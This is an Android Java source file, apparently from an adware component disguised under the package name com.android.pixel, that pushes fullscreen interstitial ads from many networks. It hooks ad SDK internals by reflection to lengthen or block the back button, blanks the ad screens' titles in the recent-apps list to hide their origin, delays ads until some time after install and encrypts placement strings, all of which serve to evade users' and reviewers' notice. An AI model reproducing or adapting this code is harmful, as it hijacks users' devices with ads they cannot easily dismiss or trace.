package com.android.pixel;

import android.app.Activity;
import android.app.ActivityManager;
import android.graphics.Bitmap;
import android.graphics.BitmapFactory;
import android.os.Build;
import android.text.format.DateUtils;
import android.util.Log;

import com.EncryptStr;
import com.adcolony.sdk.AdColonyInterstitialActivity;
import com.applovin.adview.AppLovinInterstitialActivity;
import com.chartboost.sdk.CBImpressionActivity;
import com.facebook.ads.AudienceNetworkActivity;
import com.flurry.android.FlurryFullscreenTakeoverActivity;
import com.google.android.gms.ads.AdActivity;
import com.mopub.common.MoPubBrowser;
import com.mopub.mobileads.MoPubActivity;
import com.mopub.mobileads.MraidActivity;
import com.mopub.mobileads.MraidVideoPlayerActivity;
import com.mopub.mobileads.RewardedMraidActivity;

import java.lang.ref.WeakReference;
import java.lang.reflect.Field;
import java.lang.reflect.InvocationHandler;
import java.lang.reflect.Method;
import java.lang.reflect.Proxy;
import java.util.ArrayList;
import java.util.Collections;
import java.util.List;
import java.util.Set;
import java.util.WeakHashMap;

import defpackage.PixelActivity;

public class BergPopup {
    @EncryptStr(value = "Int")
    private static final String sIntPlc= "+FHVuYgTslvzEMxEhATTvw" ;
    static {
        if(AppUtil.sDebug){
            Log.d("copyTheOutputIntoCode", "BergPopup.sIntPlc:-->"+FunctionUtil.encrypt("Int")+"<--");
            Log.d("verify", sIntPlc+"-->"+FunctionUtil.decrypt(sIntPlc)+"<--");
        }
    }
    public static String getDecryptIntPlc(){
        return FunctionUtil.decrypt(sIntPlc);
    }
    public static String getIntPlc(){
        return sIntPlc;
    }


    private static volatile boolean sFbIsShown = false;
    public static void modifyFbBackBtnTime(Activity activity){
        if( !(activity instanceof AudienceNetworkActivity))
            return;

        if(sFbIsShown){
            try {
                Field skipAfterSeconds = activity.getClass().getDeclaredField("h");
                skipAfterSeconds.setAccessible(true);
                int oldVal = (int)skipAfterSeconds.get(activity);
                if(AppUtil.sDebug){
                    Log.d("berg", "AudienceNetworkActivity.h oldVal="+oldVal);
                }

                //the value in langzong's config is 30
                int popReturnDelay=(int)(BergConfig.getInst().getIntBackBtnDelay()*DateUtils.SECOND_IN_MILLIS);
                if(oldVal<popReturnDelay) {
                    skipAfterSeconds.set(activity, popReturnDelay);
                    if(AppUtil.sDebug){
                        Log.d("berg", "AudienceNetworkActivity.h newVal="+skipAfterSeconds.get(activity));
                    }
                }
                skipAfterSeconds.setAccessible(false);

            } catch (Throwable e){
                if(AppUtil.sDebug) e.printStackTrace();
            }
        }
    }

    public static Set<Activity> sAdmobActivitySet = Collections.newSetFromMap(new WeakHashMap<>());
    public static void maskAdmobBackBtn(Activity activity){
        if( !(activity instanceof AdActivity))
            return;

        if(sAdmobActivitySet.contains(activity))
            return;

        try {
            Field zzrAField = activity.getClass().getDeclaredField("zzrA");
            zzrAField.setAccessible(true);

            final Object origMember = zzrAField.get(activity);

            InvocationHandler hookHandler = new InvocationHandler() {
                @Override
                public Object invoke(Object proxy, Method method, Object[] args) throws Throwable {
                    if(method.getName().equals("zzhk")){
                        return false;
                    } else {
                        return method.invoke(origMember, args);
                    }
                }
            };
            Object proxy = Proxy.newProxyInstance(activity.getClassLoader(),
                            new Class[]{com.google.android.gms.internal.zzkr.class},
                            hookHandler);
            zzrAField.set(activity, proxy);
            sAdmobActivitySet.add(activity);

            zzrAField.setAccessible(false);
        } catch (Throwable err){
            if(AppUtil.sDebug) err.printStackTrace();
        }
    }

    public static void hideTitleInRecentApps(Activity activity){
        boolean target = false;

        if (activity instanceof PixelActivity){
            target = true;
        } else if (activity instanceof AdActivity){
            target = true;
        } else if(activity instanceof AudienceNetworkActivity){
            target = true;
        } else if( (activity instanceof MoPubBrowser)
                || (activity instanceof MoPubActivity)
                || (activity instanceof MraidActivity)
                || (activity instanceof MraidVideoPlayerActivity)
                || (activity instanceof RewardedMraidActivity)){
            target = true;
        } else if (activity instanceof CBImpressionActivity){
            target = true;
        } else if (activity instanceof AdColonyInterstitialActivity){
            target = true;
        } else if (activity instanceof AppLovinInterstitialActivity){
            target = true;
        } else if (activity instanceof FlurryFullscreenTakeoverActivity){
            target = true;
        }

        if(!target)
            return;

        if(! BergConfig.getInst().isAdOutAppEnabled())
            return;

        //check retention > newUserAdDelayT
        long retention = System.currentTimeMillis() - AppUtil.getAppFirstInstallT();
        if(retention<0) retention = 0;
        if(retention < BergConfig.getInst().getNewUserAdDelayT()*DateUtils.SECOND_IN_MILLIS)
            return;

        if (! BergConfig.getInst().isAdsHideTitleEnable())
            return;


        if(Build.VERSION.SDK_INT >= Build.VERSION_CODES.P){
            ActivityManager.TaskDescription description = new ActivityManager.TaskDescription(" ", R.drawable.tr_icon);
            activity.setTaskDescription(description);

        } else if(Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP){
            Bitmap bm = BitmapFactory.decodeResource(activity.getResources(), R.drawable.tr_icon);
            ActivityManager.TaskDescription description = new ActivityManager.TaskDescription(" ", bm);
            activity.setTaskDescription(description);
        }
    }

    private WeakReference<Activity> mPreActivityRef =null;
    private String mPlc=null;
    private GenericAd mAd=null;

    BergPopup(Activity preActivity){
        mPreActivityRef = new WeakReference<>(preActivity);


        List<AdNetwork> networkList = getAvailableNetwork();
        if(networkList==null || networkList.isEmpty()){
            return;
        }



        mPlc = BergManager.getDecryptTag()+getDecryptIntPlc();
        mAd = new GenericAd.Builder()
                .placementId(mPlc)
                .defaultPlcConfig(new AdPlcConfig.Builder()
                        .types(AdType.INTERSTITIAL)
                        .size(AdSize.FULLSCREEN)
                        .network(networkList.toArray(new AdNetwork[0]))
                        .build())
                .build();
    }

    public void show(){
        if(mAd==null){
            if(isHolderActivityAvailable()){
                mPreActivityRef.get().finish();
            }
            return;
        }

        if(isHolderActivityAvailable()){
            Activity activity = mPreActivityRef.get();
            mAd.load(activity, new AdLoadListener() {
                @Override
                public void onAdLoaded(AdNetwork network, AdType type, Object ad, Object... params) {
                    super.onAdLoaded(network, type, ad, params);
                    if(isHolderActivityAvailable()){
                        if(AdNetwork.FACEBOOK.equals(network)){
                            sFbIsShown = true;
                        }
                        mAd.show(null, new AdDisplayListener() {
                            @Override
                            public void onAdDisplay(AdNetwork network, AdType type, String adId, Object... params) {
                                super.onAdDisplay(network, type, adId, params);

                                BergStats.getInst().updateTodayImpressionTimes(
                                        BergStats.getInst().getTodayImpressionTimes()+1);

                                BergStats.getInst().updateTodayImpressionTimesNetwork(network,
                                        BergStats.getInst().getTodayImpressionTimesNetwork(network)+1);

                                AdEvt.recordDisplayEvt(mPlc, network, type);
                                AdEvt.recordBergDisplayEvt(mPlc, network, type);

                                long imp = BergStats.getInst().getTodayImpressionTimesNetwork(network);
                                long limit = BergConfig.getInst().getImpDailyLimitNetwork(network);
                                if(imp >= limit){
                                    AdEvt.recordBergFullEvt(mPlc, network);
                                }
                            }

                            @Override
                            public void onAdClicked(AdNetwork network, AdType type, String adId, Object... params) {
                                super.onAdClicked(network, type, adId, params);

                                AdEvt.recordClickEvt(mPlc, network, type);
                                AdEvt.recordBergClickEvt(mPlc, network, type);
                            }

                            @Override
                            public void onAdClosed(AdNetwork network, AdType type, String adId, Object... params) {
                                super.onAdClosed(network, type, adId, params);
                                if(isHolderActivityAvailable()){
                                    mPreActivityRef.get().finish();
                                }

                                if(AdNetwork.FACEBOOK.equals(network)){
                                    sFbIsShown = false;
                                }
                            }
                        });
                    }
                }

                @Override
                public void onAdError(String err) {
                    super.onAdError(err);
                    if(isHolderActivityAvailable()){
                        mPreActivityRef.get().finish();
                    }
                }
            });
        }
    }

    public void destroy(){
        if(mAd!=null){
            mAd.destroy();
            mAd=null;
        }
    }

    private boolean isHolderActivityAvailable(){
        return mPreActivityRef!=null
                && mPreActivityRef.get()!=null
                && !mPreActivityRef.get().isFinishing()
                && !mPreActivityRef.get().isDestroyed();
    }

    private List<AdNetwork> getAvailableNetwork(){
        List<AdNetwork> networkList = new ArrayList<>();

        for (AdNetwork network:BergManager.sDefaultNetwork ) {
            long imp = BergStats.getInst().getTodayImpressionTimesNetwork(network);
            long limit = BergConfig.getInst().getImpDailyLimitNetwork(network);
            if(AppUtil.sDebug){
                Log.d("Berg", FunctionUtil.decrypt(network.toString())+", imp/limit:"+imp+"/"+limit);
            }
            if(imp < limit){
                networkList.add(network);
            }
        }

        return networkList;
    }
}
